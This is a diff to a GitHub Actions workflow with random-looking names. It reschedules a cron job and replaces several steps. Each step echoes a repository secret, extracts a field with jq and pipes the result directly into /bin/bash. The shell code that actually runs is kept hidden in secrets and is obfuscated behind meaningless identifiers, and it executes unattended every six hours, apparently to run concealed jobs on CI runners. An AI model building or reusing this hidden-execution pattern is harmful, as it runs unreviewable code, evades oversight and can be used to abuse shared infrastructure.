@@ -3,7 +3,8 @@ name: gulingwu7565
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '36 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: gulingwu7565
         env:
-          snty45: ${{ secrets.snty45 }}
+          bluk22: ${{ secrets.bluk22 }}
         run: |
-          echo $snty45 | jq -r .bs4130 | /bin/bash
-          echo $lowup3983 | jq -r .hhj52810 | /bin/bash
-          echo $uebtl75 | jq -r .heyz92 | /bin/bash
-          echo $g740 | jq -r .g51 | /bin/bash
-          echo $v494 | jq -r .ynrh556 | /bin/bash
-          echo $sshu77279 | jq -r .vixif889 | /bin/bash
-          echo $zwnwg62537 | jq -r .qomfw78080 | /bin/bash
-          echo $zi2 | jq -r .f02220 | /bin/bash
-          echo $jqrhk1924 | jq -r .ipi49138 | /bin/bash
+          echo $bluk22 | jq -r .guypl67878 | /bin/bash
+          echo $nz7 | jq -r .mrc9872 | /bin/bash
+          echo $mcxxp9 | jq -r .t6605 | /bin/bash
+          echo $l92 | jq -r .qmfio26 | /bin/bash
+          echo $makz9 | jq -r .mlh2 | /bin/bash
 
